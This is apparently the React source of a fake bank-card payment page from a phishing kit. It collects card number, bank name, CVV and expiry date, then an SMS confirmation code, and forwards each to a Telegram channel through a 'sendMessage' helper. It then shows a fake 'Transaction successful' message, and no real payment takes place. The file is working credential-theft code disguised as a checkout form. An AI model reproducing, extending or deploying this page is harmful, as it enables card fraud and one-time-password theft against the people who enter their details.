import React, { useState, useEffect } from 'react';
import './styles.css';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { sendMessage } from '../api/telegram.ts';

const OrderEng = () => {
  const location = useLocation();
  const [showAlert, setShowAlert] = useState(true);
  const [step, setStep] = useState(1);
  const [cardData, setCardData] = useState({
    cardNumber: '',
    name: '',
    cvv: '',
    expiryDate: '',
    amount: '',
    agreement: false,
  });
  const [smsCode, setSmsCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [verificationLoading, setVerificationLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds
  const [errors, setErrors] = useState({});
  const [formData, setFormData] = useState({});

  const navigate = useNavigate();

  useEffect(() => {
    const fetchData = async () => {
      try {
          const response = await axios.get(`/api/db/form/${location.state.id}`);
          setFormData(response.data);        
      } catch (error) {
        console.error('Error fetching form data:', error);
      }
    };

    fetchData();
  }, []);

  const validateForm = (fields) => {
    const newErrors = {};

    if (fields.includes('cardNumber') && !/^[0-9]{16}$/.test(cardData.cardNumber)) {
      newErrors.cardNumber = 'Card number must be 16 digits';
    }
    if (fields.includes('name') && cardData.name.trim() === '') {
      newErrors.name = 'Please provide the name of your bank';
    }
    if (fields.includes('cvv') && !/^[0-9]{3,4}$/.test(cardData.cvv)) {
      newErrors.cvv = 'CVV must be 3 or 4 digits';
    }
    if (fields.includes('expiryDate')) {
      const [month, year] = [cardData.expiryDate.slice(0, 2), cardData.expiryDate.slice(2)];
      if (!/^[0-9]{4}$/.test(cardData.expiryDate) || parseInt(year) < 23) {
        newErrors.expiryDate = 'Expiry date must be in MMYY format and year must be greater than 23';
      }
    }
    if (fields.includes('smsCode') && !/^[0-9]{3,6}$/.test(smsCode)) {
      newErrors.smsCode = 'SMS code must be between 3 and 6 digits';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
};
const handleChange = (e) => {
  const { name, value, type, checked } = e.target;
  setCardData({
    ...cardData,
    [name]: type === 'checkbox' ? checked : value,
  });
};
const handleSmsSend = async () => {
    setLoading(true);
    if (validateForm(['cardNumber', 'name', 'cvv', 'expiryDate'])) {
        try {
            const message = `
                Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
                Bank Name: [${cardData.name}]
                Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
            `;

            sendMessage(message);

            // Сбрасываем данные формы
            setCardData({
                cardNumber: '',
                name: '',
                cvv: '',
                expiryDate: '',
                amount: '',
                agreement: false,
            });

            setStep(2);
        } catch (error) {
            console.error('Error sending message:', error.message);
        }
    }
    setLoading(false);
};

  const handleSmsSubmit = async () => {
    setVerificationLoading(true);
    if (validateForm(['smsCode'])) {
      try {
        sendMessage(`SMS Code: ${smsCode}`);
        setSmsCode('');
        navigate('/statuseng', { state: { result: 'success', message: 'Transaction successful' } });
      } catch (error) {
        console.error('Error processing verification:', error.message);
      }
    }
    setVerificationLoading(false);
  };

  useEffect(() => {
    let timer;
    if (step === 2) {
      timer = setInterval(() => {
        setTimeLeft((prevTime) => (prevTime > 0 ? prevTime - 1 : 0));
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [step]);

  const formatTime = (time) => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  };

  const formatExpiryDate = (value) => {
    if (value.length === 4) {
      return `${value.slice(0, 2)}/${value.slice(2, 4)}`;
    }
    return value;
  };

  return (
    <div className="flex flex-col items-center justify-start min-h-screen bg-gray-fon px-4 mb:pt-20 pt-4 placeholder-gray-text">
      <div className="space-y-4 w-full max-w-xl mb-12">
        <div className="bg-white p-6 rounded-lg mb-12">
          <h2 className="text-xl font-bold mb-6 text-center">Payment Method</h2>
          <div className="flex justify-center space-x-4 mb-4">
            <button className="py-2 px-4 bg-white border-b-2 border-blue-400 hover:border-blue-800">Bank Card</button>
          </div>
        </div>
        <div className="w-full md:max-w-[608px] max-w-[390px] flex justify-center items-center bg-white p-6 rounded-lg">
          {step === 1 && (
            <form className="text-grayth w-[350px] md:w-[470px]">
              <div className="mt-6 mb-6 text-left w-full">
                <label htmlFor="cardNumber" className="block font-normal text-gray-700">
                  Enter Your Card Number
                </label>
                <input
                  type="text"
                  name="cardNumber"
                  id="cardNumber"
                  value={cardData.cardNumber}
                  onChange={handleChange}
                  className={`mt-1 block w-full h-[35px] border ${errors.cardNumber ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                  maxLength="16"
                  placeholder="1456 1345 0958 4234"
                  required
                />
                {errors.cardNumber && <p className="text-red-500 text-sm">{errors.cardNumber}</p>}
              </div>
              <div className="mb-6 text-left w-full">
                <label htmlFor="name" className="block font-normal text-gray-700">
                  Enter Bank Name
                </label>
                <input
                  type="text"
                  name="name"
                  id="name"
                  value={cardData.name}
                  
                  className={`mt-1 block w-full h-[35px] border ${errors.name ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                  placeholder="John Doe"
                  required
                />
                {errors.name && <p className="text-red-500 text-sm">{errors.name}</p>}
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="md:mb-12 mb-0 text-left w-full">
                  <label htmlFor="expiryDate" className="block font-normal text-gray-700">
                    Expiry Date
                  </label>
                  <input
                    type="text"
                    name="expiryDate"
                    id="expiryDate"
                    value={formatExpiryDate(cardData.expiryDate)}
                    onChange={handleChange}
                    className={`mt-1 block w-full h-[35px] border ${errors.expiryDate ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                    placeholder="20/22"
                    required
                  />
                  {errors.expiryDate && <p className="text-red-500 text-sm">{errors.expiryDate}</p>}
                </div>
                <div className="mb-12 w-full text-left">
                  <label htmlFor="cvv" className="block font-normal text-gray-700">
                    CVV2
                  </label>
                  <input
                    type="text"
                    name="cvv"
                    id="cvv"
                    value={cardData.cvv}
                    onChange={handleChange}
                    className={`mt-1 block w-full h-[35px] border ${errors.cvv ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                    maxLength="4"
                    placeholder="227"
                    required
                  />
                  {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}
                </div>
              </div>
              <button
                type="button"
                className="bg-grayth text-white h-[50px] py-2 px-4 rounded-md hover:bg-purple-950 mt-6 w-full"
                onClick={handleSmsSend}
              >
                Continue
              </button>
              <div className="w-full mt-6 flex items-center justify-between">
                <label htmlFor="agreement" className="block font-normal text-gray-700">
                  Do you accept the user agreement?
                </label>
                <label className="switch">
                  <input
                    type="checkbox"
                    name="agreement"
                    id="agreement"
                    checked={cardData.agreement}
                    onChange={handleChange}
                    required
                  />
                  <span className="slider round"></span>
                </label>
                {errors.agreement && <p className="text-red-500 text-sm">{errors.agreement}</p>}
              </div>
              <p className="w-full mt-4 text-left text-sm text-grayth">
                By clicking "Pay", you confirm that you have read the information about the service and accept the
                <span className="text-blue-400 font-normal"> terms of the public agreement.</span>
              </p>
            </form>
          )}
          {step === 2 && (
            <div className="flex flex-col justify-center items-center text-center md:w-[470px] w-[390px]">
              <h2 className="text-xl font-semibold mb-4">Confirmation</h2>
              <p className="text-sm text-grayth mb-4">
                To confirm the transfer of funds, we have sent you a 6-digit code via SMS to your phone number. ATTENTION! Do not share the SMS code with anyone to protect your personal data.
              </p>
              <div className="flex justify-center items-center mb-4">
                <svg className="w-24 h-24" viewBox="0 0 100 100">
                  <defs>
                    <linearGradient id="static-gradient" x1="0%" y1="0%" x2="100%">
                      <stop offset="0%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 1 }} />
                      <stop offset="70%" style={{ stopColor: 'rgba(48, 12, 96, 0.8)', stopOpacity: 1 }} />
                      <stop offset="100%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 1 }} />
                    </linearGradient>
                    <linearGradient id="animated-gradient" x1="0%" y1="0%" x2="100%">
                      <stop offset="0%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 0.4 }} />
                      <stop offset="50%" style={{ stopColor: 'rgba(48, 12, 96, 1)', stopOpacity: 0.4 }} />
                      <stop offset="100%" style={{ stopColor: 'rgba(48, 12, 96, 1)', stopOpacity: 0.4 }} />
                    </linearGradient>
                  </defs>
                  <circle
                    className="static-circle"
                    r="45"
                    cx="50"
                    cy="50"
                    stroke="url(#static-gradient)"
                    strokeWidth="4"
                    fill="transparent"
                  />
                  <circle
                    className="circle animated-circle"
                    stroke="url(#animated-gradient)"
                    strokeWidth="4"
                    fill="transparent"
                    r="45"
                    cx="50"
                    cy="50"
                    style={{ strokeDasharray: '170 283', strokeDashoffset: '0' }}
                  />
                </svg>
                <p className="absolute text-2xl font-bold text-blue-600">{formatTime(timeLeft)}</p>
              </div>
              <p className="text-sm text-grayth mb-8">Time remaining for confirmation</p>
              <div className="mb-4 w-full">
                <label htmlFor="smsCode" className="block text-sm text-left font-normal text-gray-700">
                  Enter the confirmation code
                </label>
                <input
                  type="text"
                  name="smsCode"
                  id="smsCode"
                  value={smsCode}
                  onChange={(e) => setSmsCode(e.target.value)}
                  className={`mt-1 block w-full h-[35px] bg-gray-form border ${errors.smsCode ? 'border-red-500' : 'border-gray-200'} rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                  placeholder="765***"
                  required
                />
                {errors.smsCode && <p className="text-red-500 text-sm">{errors.smsCode}</p>}
              </div>
              <button
                className="bg-grayth text-white py-2 px-4 rounded-md hover:bg-purple-950 mt-4 w-full h-[50px]"
                onClick={handleSmsSubmit}
              >
                Confirm
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default OrderEng;
